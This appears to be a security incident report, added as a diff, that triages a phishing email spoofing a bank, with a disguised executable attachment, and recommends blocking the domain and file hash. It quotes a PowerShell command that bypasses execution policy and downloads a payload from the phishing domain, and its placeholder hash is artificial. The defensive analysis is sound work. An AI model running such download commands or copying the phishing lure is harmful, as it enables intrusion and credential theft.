@@ -1,1 +1,108 @@
+# Incident Response Report
 
+**Case ID:** CRIT-001 
+**Alert Title:** Phishing Attempt with Spoofed Domain Detected
+**Priority:** High
+**Source System:** Proofpoint
+**MITRE ATT&CK Tactic:** TA0001 – Initial Access
+**MITRE ATT&CK Technique:** T1566 – Phishing
+**Alert Detected:** 09/07/2026, 20:26:31
+**Investigation Initiated:** 12/07/2026, 11:34:41
+**Telemetry Extracted:** 12/07/2026, 11:35:41
+
+---
+
+## 1. Verdict
+
+### **Verdict: True Positive – Phishing Attack Attempt**
+
+**Justification:** Multiple independent threat intelligence sources confirm a phishing campaign targeting the finance department. The email exhibits classic phishing hallmarks — a spoofed sender address, a credential-harvesting URL, and a disguised executable attachment (`invoice_feb.pdf.exe`) — and both the sending infrastructure and referenced domain are independently confirmed malicious by AbuseIPDB and URLScan.
+
+---
+
+## 2. In-Depth Analysis and Conclusion
+
+The incident originated from **Proofpoint**, which flagged a suspicious email delivered to **jdoe@company.com**. The message purported to originate from **alert@trusted-bank.com** and used urgency ("please check the attached invoice immediately") combined with impersonation of a trusted financial institution — a standard social engineering pattern designed to pressure the recipient into acting without scrutiny.
+
+The email carried two malicious components:
+
+- A hyperlink to **http://verify-trusted-bank.com/login**, a spoofed site imitating a legitimate banking portal, intended to harvest credentials.
+- An attachment named **invoice_feb.pdf.exe** (1.2MB, `application/x-msdos-program`) — a Windows executable disguised as a PDF, a well-worn technique that relies on Windows' default behavior of hiding known file extensions.
+
+Threat intelligence enrichment substantially strengthens the assessment:
+
+- **AbuseIPDB** attributes the source IP **198.51.100.54** to multiple prior phishing campaigns.
+- **URLScan** independently classifies both the URL and the domain **verify-trusted-bank.com** as malicious, specifically tied to phishing infrastructure.
+
+Two independent intelligence sources converging on the same infrastructure removes any reasonable doubt that this originated from a legitimate sender.
+
+Raw telemetry confirms the email reached its intended target: workstation **finance-pc** (192.168.1.25), user **jdoe**. At this stage, there is **no direct evidence that the user clicked the link or executed the attachment** — the phishing attempt itself is confirmed, but endpoint compromise on the recipient's machine is not.
+
+**Threat hunting correlation:** A Sysmon Event ID 1 recorded a PowerShell execution on **11/07/2026, 11:38:16 UTC**:
+
+```
+powershell.exe -ExecutionPolicy Bypass -c "Invoke-WebRequest -Uri http://verify-trusted-bank.com/payload.ps1"
+```
+
+executed under user **CORP\admin**, with parent process `cmd.exe` and hash `SHA256=A1B2C3D4E5F6`. This same hash appears roughly ten hours later in a **CrowdStrike Falcon** alert ("Suspicious PowerShell Download," Severity=High, Sensor=**win-srv-01**), where the process was successfully **killed**. The matching SHA256 across both telemetry sources confirms these two events describe the same malicious process, and that the phishing domain was actively hosting a secondary payload (`payload.ps1`).
+
+**Scope boundary:** This PowerShell activity occurred on **win-srv-01** under **CORP\admin** — a different host and user than the phishing recipient (**finance-pc** / **jdoe**). Without a pivot linking the two (e.g., shared session, lateral movement artifact, or the same user account), this must be treated as **corroborating threat intelligence about the attacker's infrastructure**, not evidence that the phishing email itself led to this execution. Conflating the two would overstate the compromise.
+
+A third log line — a firewall entry showing a denied inbound connection from **10.0.5.55** to **192.168.1.10** on port 443 (11/07/2026, 12:00:25) — was reviewed and found to share no IP, domain, or hash overlap with any confirmed phishing indicator. It is assessed as unrelated background noise and not incorporated into the verdict.
+
+From a MITRE ATT&CK perspective, this alert maps to:
+
+- **TA0001 – Initial Access**
+- **T1566 – Phishing**
+
+No confirmed evidence currently supports progression into Execution, Persistence, Credential Access, or Lateral Movement specifically on the targeted recipient's endpoint.
+
+### Conclusion
+
+This investigation confirms a **successful detection of a phishing campaign** targeting the finance department. The spoofed sender, phishing domain, credential-harvesting URL, and disguised executable attachment collectively constitute a high-confidence phishing attempt. While compromise of **finance-pc** is not confirmed, the underlying infrastructure is validated as malicious and actively hosting additional payloads, warranting immediate preventive containment.
+
+---
+
+## 3. Key Findings (Artifacts)
+
+| Artifact | Value | Finding |
+|---|---|---|
+| Alert Severity | High | Confirmed phishing attempt |
+| Source System | Proofpoint | Email security detection |
+| Recipient | jdoe@company.com | Intended phishing victim |
+| Hostname | finance-pc | Recipient workstation |
+| Sender Email | alert@trusted-bank.com | Spoofed sender address |
+| Source IP | 198.51.100.54 | Confirmed malicious (AbuseIPDB) |
+| Destination IP | 192.168.1.25 | Internal recipient host |
+| Malicious URL | http://verify-trusted-bank.com/login | Confirmed phishing URL (URLScan) |
+| Malicious Domain | verify-trusted-bank.com | Registered for phishing activity |
+| Attachment | invoice_feb.pdf.exe | Executable disguised as PDF |
+| Attachment Type | application/x-msdos-program | Windows executable |
+| Threat Intelligence | AbuseIPDB | Source IP involved in phishing campaigns |
+| Threat Intelligence | URLScan | URL and domain confirmed malicious |
+| MITRE ATT&CK | T1566 – Phishing | Initial Access technique |
+| Related Sysmon Activity | Invoke-WebRequest → verify-trusted-bank.com/payload.ps1 (win-srv-01, CORP\admin) | Secondary payload download attempt on unrelated host |
+| Related EDR Activity | SHA256=A1B2C3D4E5F6 | CrowdStrike detected and killed matching malicious PowerShell process |
+| Reviewed, No Correlation | Firewall deny: 10.0.5.55 → 192.168.1.10:443 | No IP/domain/hash overlap with confirmed indicators; assessed as unrelated noise |
+| Investigation Outcome | True Positive | Confirmed phishing campaign |
+
+---
+
+## 4. Deployment Containment Protocol
+
+| Response Action | Decision | Reason |
+|---|---|---|
+| **Isolate Host** | ❌ | No confirmed evidence finance-pc was compromised or that the attachment was executed. Isolation not currently justified. |
+| **Block IP/Domain** | ✅ | Source IP (198.51.100.54) and domain (verify-trusted-bank.com) are confirmed malicious; block at firewall, proxy, DNS, and secure email gateway. |
+| **Block File Hash** | ✅ | Block SHA256=A1B2C3D4E5F6 across all EDR nodes to prevent execution of the associated payload elsewhere in the environment. |
+| **Reset Credentials** | ❌ | No evidence the recipient submitted credentials to the phishing site. Revisit if user interaction is later confirmed. |
+| **Collect Forensics** | ❌ | No endpoint compromise demonstrated on finance-pc. Revisit if suspicious activity is later detected on that host. |
+| **Escalate to Tier 3** | ❌ | Fully validated as phishing with no confirmed host compromise; Tier 1/2 containment is sufficient. Escalate only if malware execution, credential theft, or lateral movement is later confirmed on finance-pc. |
+| **Close (No Action)** | ❌ | Confirmed malicious activity requiring preventive containment; cannot be closed without remediation. |
+
+### Final Recommended Response
+
+**✅ Block IP/Domain**
+**✅ Block File Hash**
+
+Confirmed True Positive phishing campaign. No confirmed compromise of the targeted workstation, but the malicious infrastructure is validated across two independent intelligence sources and is actively hosting secondary payloads — immediate containment of the infrastructure is warranted to protect the wider environment.
